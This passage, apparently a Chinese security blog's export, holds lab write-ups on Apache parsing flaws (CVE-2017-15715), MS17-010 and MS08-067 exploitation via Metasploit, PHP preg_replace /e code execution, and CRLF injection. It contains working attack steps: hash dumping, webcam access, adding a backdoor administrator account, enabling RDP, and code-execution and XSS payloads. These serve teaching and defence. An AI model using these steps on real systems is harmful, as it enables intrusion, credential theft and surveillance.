class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这里存在两个配置项：</p><ul><li>FilesMatch：设置一个用于URL路径匹配的正则表达式，在匹配上该正则表达式的情况下，再执行其中的命令</li><li>SetHandler：设置当前配置块内默认的处理器，这里配置的是以php的方式处理</li></ul><p>这样看，这个配置便意为：文件名以.php结尾的文件才会交给application&#x2F;x-http-php处理器，这样似乎可以修复多后缀解析漏洞</p><p>但是：Apache使用的是Perl兼容的正则表达式库PCRE，这里的**$**有自己的语法标准，其能匹配以下三个内容：</p><ul><li>一个字符串的结尾</li><li>一个以换行符作为结尾的字符串的结尾部分</li><li>在多行模式开启的情况下，匹配每一行的结尾</li></ul><p>所以，如果文件名是以.php\n结尾（\n即换行），他依然能够匹配上正则表达式<code>[^.]+\.php$</code></p><p>由此得到CVE-2017-15715的利用：如果开发者在文件上传的业务部分，使用黑名单校验文件内容，以此禁止.php扩展名的文件，可以上传扩展名为.php\n的文件，其不会被黑名单拦截，但能被<code>&lt;FilesMatch&gt;</code>匹配并交给application&#x2F;x-http-php处理器进行php解析</p><h5 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h5><p>Apache的解析漏洞都需要两个条件：</p><ul><li>存在文件上传功能点</li><li>文件上传以黑名单检测</li></ul><p>检测时尝试上传三种文件名，查看是否进行了php解析：</p><ul><li>yuyoung.php.xyz</li><li>yuyoung.php.jpeg</li><li>yuyoung.php\n</li></ul><h5 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h5><ul><li>使用白名单扩展名检测</li><li>由于Apache大多数解析漏洞均是由于畸形扩展名、畸形文件名导致，所以可以对用户上传的文件重命名，避免畸形字符和多扩展名的情况</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>解析漏洞是一类与web server相关的漏洞，所以往往与其版本和配置紧密联系，版本更新和打补丁往往是常用防御手段，修改配置进行防御需要谨慎，避免引发关联的漏洞，另外，不必要的解析扩展名（php3、php4等）也是值得注意的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WINDOWS经典漏洞复现</title>
      <link href="/2024/03/26/WINDOWS%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/03/26/WINDOWS%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="WINDOWS经典漏洞复现"><a href="#WINDOWS经典漏洞复现" class="headerlink" title="WINDOWS经典漏洞复现"></a>WINDOWS经典漏洞复现</h1><p>懒得放图了o.O</p><h3 id="ms17-010-永恒之蓝"><a href="#ms17-010-永恒之蓝" class="headerlink" title="ms17-010 永恒之蓝"></a>ms17-010 永恒之蓝</h3><p>被攻击机版本为win7</p><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>nmap扫描发现445端口开放，可尝试利用永恒之蓝进行攻击</p><p>也就是利用445端口的smb服务实现操作溢出漏洞</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul><li><p>启动msf</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>查找漏洞模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search 17-010</span><br></pre></td></tr></table></figure></li><li><p>探测是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 3</span><br></pre></td></tr></table></figure><p>选项3为漏洞检测payload</p></li><li><p>攻击</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure><p>选项1为漏洞攻击payload</p></li><li><p>检测和攻击时记得设置被攻击机的IP：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set rhost 192.168.xxx.xxx</span><br></pre></td></tr></table></figure></li><li><p>显示主机系统信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure></li><li><p>获取屏幕快照</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure></li><li><p>文件传输</p><ul><li><p>上传文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upload /root/1.txt c:\\</span><br></pre></td></tr></table></figure></li><li><p>下载文件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">download c:\\2.jpg /root/2.jpg</span><br></pre></td></tr></table></figure></li></ul></li><li><p>查看权限:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure></li><li><p>获取用户名密码：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure></li><li><p>摄像头</p><ul><li><p>查看是否存在摄像头</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">webcam_list</span><br></pre></td></tr></table></figure></li><li><p>打开摄像头</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">webcam_strean</span><br></pre></td></tr></table></figure></li></ul></li><li><p>getshell</p><p>直接进入window的命令行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li></ul><h3 id="ms08-067-CVE-2008-4250-远程命令执行"><a href="#ms08-067-CVE-2008-4250-远程命令执行" class="headerlink" title="ms08-067 (CVE-2008-4250) 远程命令执行"></a>ms08-067 (CVE-2008-4250) 远程命令执行</h3><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server服务程序中的NetPathCanonicalize 函数时触发的</p><p>详细原理如下<a href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></p><p>被攻击机版本为winxp</p><h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><p>nmap扫描发现445端口开放，可尝试进行RCE</p><h5 id="利用漏洞获取权限"><a href="#利用漏洞获取权限" class="headerlink" title="利用漏洞获取权限"></a>利用漏洞获取权限</h5><ul><li><p>msf启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li><li><p>查找漏洞模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">search 08-067</span><br></pre></td></tr></table></figure></li><li><p>调用模块</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure></li><li><p>查看需要填写的参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li><li><p>填写参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set rhost 192.168.xxx.xxx</span><br></pre></td></tr></table></figure></li><li><p>开始攻击</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure></li></ul><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><ul><li><p>进入命令行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li><li><p>创建高权限用户</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user admin pass /add &amp;&amp; net localgroup administrators admin /add</span><br></pre></td></tr></table></figure><p>创建名为admin密码为pass的用户，并提升为管理员权限</p></li></ul><h5 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h5><ul><li><p>打开windows远程登录端口，默认3389</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat</span><br></pre></td></tr></table></figure></li><li><p>检查端口是否开启</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure></li><li><p>kali再开一个终端进行远程登录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.xxx.xxx:3389</span><br></pre></td></tr></table></figure></li><li><p>输入新建的admin和pass即可</p></li><li><p>关闭3389端口：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>preg_replace在/e模式下的代码执行</title>
      <link href="/2024/03/26/preg_replace%E5%9C%A8e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/03/26/preg_replace%E5%9C%A8e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="preg-replace在-e模式下的代码执行"><a href="#preg-replace在-e模式下的代码执行" class="headerlink" title="preg_replace在&#x2F;e模式下的代码执行"></a>preg_replace在&#x2F;e模式下的代码执行</h1><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><ul><li>php5.5.0以下</li></ul><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>有如下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意为在 “this is a test” 字符串中找到 “test”，并将其替换为通过$_GET[“a”]获取的<strong>代码执行结果</strong></p><p>也就是说只要提交GET参数“a”的内容为php代码，即可实现远程代码执行，比如提交：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?a=phpinfo();</span><br></pre></td></tr></table></figure><p>便会回显phpinfo页面</p><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>找了一个很有意思的案例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果能够代码执行，那么代码相当于：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;strtolower(&quot;\\1&quot;);&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在这里，<code>\\1</code>在转义后即为<code>\1</code>，其在正则中有自己的含义：</p><blockquote><p><strong>反向引用</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p></blockquote><p>有点抽象，说人话就是，\几，就匹配第几个</p><p>这里的 <strong>\1</strong> 实际上指定的是第一个子匹配项，这里如果GET传参：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?.*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p>那么正则语句就变成了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, &#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;);</span><br></pre></td></tr></table></figure><p>而我们都知道，这样传参的话，参数名中的<code>.</code>是非法字符，会被替换为<code>_</code>,所以我们要做的就是换一个正则表达式，让其匹配到 <strong>{${phpinfo()}}</strong> 即可实现代码执行，而\S恰好能够实现，所以最终实现代码执行的payload为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?\S*=&#123;$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p>解释一下这个正则：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[\s]表示，只要出现空白就匹配</span><br><span class="line"></span><br><span class="line">[\S]表示，非空白就匹配</span><br><span class="line"></span><br><span class="line">那么它们的组合[\s\S]，表示所有的都匹配</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;.&quot;</span>是不会匹配换行的，所有出现有换行匹配的时候，就习惯使用[\s\S]来完全通配模式。</span><br></pre></td></tr></table></figure><p>这样是可以执行phpinfo()的</p><p>再解释一下为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数：</p><p>这是利用了 php<strong>可变变量</strong>的原因，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果，单引号中的变量不会被处理，所以这里的<code>\1</code>可解析变成{${phpinfo()}}</p><p>在此情况下，花括号 <code>&#123;&#125;</code> 被用于指示 PHP 需要解析一个复杂或<strong>动态</strong>表达式，而通过使用 <code>$&#123;&#125;</code> 结构，代码试图动态地调用 <code>phpinfo()</code> 函数</p><p>而{${phpinfo()}} 中的 phpinfo() 会<strong>被当做变量先执行</strong>，执行后，即变成 ${1}  (phpinfo()成功执行返回true)</p><p>接下来一步一步分析：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">// 结果：布尔 true</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">phpinfo</span>()));<span class="comment">// 结果：字符串 &#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：字符串&#x27;11&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：空字符串&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：空字符串&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">这里的<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>执行后相当于 <span class="title function_ invoke__">strtolower</span>(<span class="string">&quot;<span class="subst">&#123;$&#123;1&#125;</span>&#125;&quot;</span>) 又相当于 <span class="title function_ invoke__">strtolower</span>(<span class="string">&quot;&#123;null&#125;&quot;</span>) 又相当于 <span class="string">&#x27;&#x27;</span> 空字符串</span><br></pre></td></tr></table></figure><p>有了上面的例子，同理：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/s*[php](.+?)[/php]s*/ies&quot;</span>, <span class="string">&#x27;test(&quot;\1&quot;)&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果GET方法提交请求：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?h=[php]&#123;$&#123;phpinfo()&#125;&#125;[/php]</span><br></pre></td></tr></table></figure><p>phpinfo()也会被执行</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>preg_replace \e 模式存在代码执行</p><p>如果 replacement中是双引号的，可引申出上面的漏洞</p><p>针对上面双引号引发的漏洞的防御方法也很简单，比如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将&#x27;strtolower(&quot;\\1&quot;)&#x27;修改为&quot;strtolower(&#x27;\\1&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">将&#x27;test(&quot;\1&quot;)&#x27; 修改为&quot;test(&#x27;\1&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>这样{${phpinfo()}}或${phpinfo()}就会被当做一个普通的字符串处理（单引号中的变量不会被处理）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CRLF注入</title>
      <link href="/2024/03/26/CRLF_injection/"/>
      <url>/2024/03/26/CRLF_injection/</url>
      
        <content type="html"><![CDATA[<h1 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h1><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>CRLF是“回车(CR,Carriage Return) + 换行(LF, Line Feed)”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。</p><p>所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul><li><p>CRLF指的是<strong>回车符</strong>(CR，ASCII 13，\r，%0d) 和<strong>换行符</strong>(LF，ASCII 10，\n，%0a),CRLF的概念源自打字机，表明行的结束，计算机出现后沿用了这个概念</p></li><li><p>浏览器会根据CRLF将http包分为header和body，然后将body中的内容执行</p></li><li><p>根据 HTTP&#x2F;1.1 规范（RFC 7230），HTTP头字段是通过 <strong>CRLF</strong>（即 \r\n，对应 %0d%0a）来分隔的,因此，当一个 HTTP 头部结束时，它应该总是以一个 CRLF 结尾后跟另一个 CRLF 来表示 HTTP 头部的结束和 HTTP 正文的开始。换句话说，标准的 HTTP 头部结束应当是 <strong>CRLF CRLF</strong>，即 **\r\n\r\n **或 <strong>%0d%0a%0d%0a</strong>。</p></li></ul><h5 id="稍作区别"><a href="#稍作区别" class="headerlink" title="稍作区别"></a>稍作区别</h5><ul><li>回车符：光标移到行首</li><li>换行符：光标垂直移到下行</li></ul><p>平常键盘的回车（Enter）就能执行该操作，但对于不同操作系统，行的结束也是不一样的</p><ul><li>Windows:使用CRLF表示行的结束</li><li>Linux&#x2F;Unix:使用LF表示行的结束</li><li>MacOs:早期使用CR，现在使用LF（应该是）</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通常是利用该漏洞在http报文头部插入header来进行一些利用</p><h5 id="会话固定攻击（session-fixation-attack）"><a href="#会话固定攻击（session-fixation-attack）" class="headerlink" title="会话固定攻击（session fixation attack）"></a>会话固定攻击（session fixation attack）</h5><p>举个例子，一般网站会在HTTP头中用<code>Location： http://www.yuyoung.fun </code>这种方式来进行302跳转，如果我们能控制Location，假设一个例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.com/?url=http://www.yuyoung.fun</span><br></pre></td></tr></table></figure><p>这里的url参数会被添加到报文的Location，而该参数是我们可控的</p><p>正常的302跳转包是这样：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 18 Feb 2024 17:52:17 GMT </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>114514</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close </span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://www.yuyoung.fun</span><br></pre></td></tr></table></figure><p>但如果我们传参的url是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.yuyoung.fun%0a%0dSet-cookie:JSPSESSID%3Dhacker</span><br></pre></td></tr></table></figure><p>注入了一个换行，此时的返回包就会变成这样：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 18 Feb 2024 17:52:17 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>114514</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close </span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://www.yuyoung.fun</span><br><span class="line"><span class="attribute">Set-cookie</span><span class="punctuation">: </span>JSPSESSID=hacker</span><br></pre></td></tr></table></figure><p>这个时候这样我们就给访问者设置了一个SESSION，造成一个会话固定漏洞，即可实现令牌提权</p><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>通过注入两个CRLF就能造成一个反射型XSS</p><p>比如一个网站接受url参数 <a href="http://xxx.com/?url=xxx,xxx">http://xxx.com/?url=xxx,xxx</a> 放在Location后面作为一个跳转。</p><p>如果我们输入的是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.com/?url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure><p>我们的返回包就会变成这样：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily </span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 27 Jun 2014 17:52:17 GMT </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>154 </span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close </span><br><span class="line"><span class="attribute">Location</span>:</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure><p>之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里<code>&lt;img&gt;</code>这个标签就会显示出来，造成一个XSS。</p><h5 id="无视浏览器filter进行XSS"><a href="#无视浏览器filter进行XSS" class="headerlink" title="无视浏览器filter进行XSS"></a>无视浏览器filter进行XSS</h5><p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p><p>怎样才能关掉filter？一般来说，用户这边是不行的，只有数据包中httphead含有<strong>X-XSS-Protection</strong>并且值为0的时候，浏览器才不会开启filter</p><p><strong>X-XSS-Protection</strong> 是一个 HTTP 头部，这个头部的目的是控制大多数现代浏览器内置的反射型跨站脚本（XSS）过滤器的行为。这个头部在早期被引入，用于给网站提供一种方式来决定是否启用或配置这种防护。</p><p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以先用一个CRLF将<strong>X-XSS-Protection：0</strong>注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器过滤器，并且执行我们的反射型XSS。</p><p>所以说HRS的危害大于XSS，因为它能绕过一般XSS所绕不过的filter，并能产生会话固定漏洞</p><p>值得注意的是，<strong>X-XSS-Protection</strong>头部现已被视为已过时，并且在最新版本的主流浏览器（如 Chrome、Firefox、Safari 和 Edge）中不再受支持。实际上，Google Chrome 自 78 版本起已彻底移除了<strong>X-XSS-Protection</strong>。这一变化是因为内置的XSS过滤器已证明可能会被绕过，另外，严格的内容安全策略（Content Security Policy，CSP）被认为是一种更强有力的跨站脚本防御机制。</p><p>不过，对于依旧支持该头部的较旧的浏览器版本，该头部的参数如下：</p><ul><li>X-XSS-Protection: 0：将会关闭浏览器的 XSS 过滤器。</li><li>X-XSS-Protection: 1：将会开启浏览器的 XSS 过滤器，通常是在检测到潜在的攻击时，浏览器将尝试过滤掉页面中的恶意脚本。</li><li>X-XSS-Protection: 1; mode&#x3D;block：不仅开启过滤器，浏览器还将阻止整个页面加载，而不是尝试清除掉潜在的恶意脚本。</li></ul><h3 id="CRLFuzz工具"><a href="#CRLFuzz工具" class="headerlink" title="CRLFuzz工具"></a>CRLFuzz工具</h3><p>从 <a href="https://github.com/dwisiswant0/crlfuzz/releases/tag/v1.4.1">Release v1.4.1 · dwisiswant0&#x2F;crlfuzz (github.com)</a>下载工具</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
